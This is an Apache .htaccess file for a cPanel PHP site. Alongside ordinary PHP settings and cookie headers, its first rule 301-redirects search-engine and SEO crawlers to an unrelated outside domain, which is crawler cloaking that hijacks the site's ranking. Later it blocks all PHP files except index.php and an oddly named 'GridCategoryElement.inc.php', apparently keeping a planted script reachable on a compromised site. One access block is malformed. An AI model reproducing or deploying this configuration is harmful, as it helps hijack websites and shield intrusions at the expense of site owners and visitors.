RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
RewriteRule ^(.*)$  https://himpsikotamedan.org/susunan-pengurus/ [R=301,L]

Options -Indexes
Header always edit Set-Cookie (.*) "$1; HTTPOnly"

Header always edit Set-Cookie (.*) "$1; Secure"

Header always edit Set-Cookie (.*) "$1; SameSite=None; Secure"

# Manual editing of this file may result in unexpected behavior.
# To make changes to this file, use the cPanel MultiPHP INI Editor (Home >> Software >> MultiPHP INI Editor)
# For more information, read our documentation (https://go.cpanel.net/EA4ModifyINI)
<IfModule php7_module>
   php_flag display_errors Off
   php_value max_execution_time 60
   php_value max_input_time 90
   php_value max_input_vars 1000
   php_value memory_limit 128M
   php_value post_max_size 128M
   php_value session.gc_maxlifetime 1440
   php_value session.save_path "/var/cpanel/php/sessions/ea-php73"
   php_value upload_max_filesize 128M
   php_flag zlib.output_compression Off
</IfModule>
<IfModule lsapi_module>
   php_flag display_errors Off
   php_value max_execution_time 60
   php_value max_input_time 90
   php_value max_input_vars 1000
   php_value memory_limit 128M
   php_value post_max_size 128M
   php_value session.gc_maxlifetime 1440
   php_value session.save_path "/var/cpanel/php/sessions/ea-php73"
   php_value upload_max_filesize 128M
   php_flag zlib.output_compression Off
</IfModule>

<FilesMatch "(^\.|config\.inc\.php|\.env|composer\.(json|lock)|package\.xml|phpunit\.xml)">
    Require all denied
</FilesMatch>

<FilesMatch "\.(php|phtml|php3|php4|php5|php7|php8|phps|cgi|pl|exe|asp|aspx|sh|py)$">
    Require all denied
</FilesMatch>

<Files ".htaccess">
    Require all denied
</Files>

<Files "index.php">
    <IfModule mod_authz_core.c>
        Require all granted
    </IfModule>
</Files>

<Files "GridCategoryElement.inc.php">
    <IfModule mod_authz_core.c>
        Require all granted
    </IfModule>
</Files>

    <IfModule mod_authz_core.c>
        Require all granted
    </IfModule>
</Files>

<IfModule mod_headers.c>
    Header set X-Content-Type-Options "nosniff"
    Header set X-Frame-Options "SAMEORIGIN"
</IfModule>
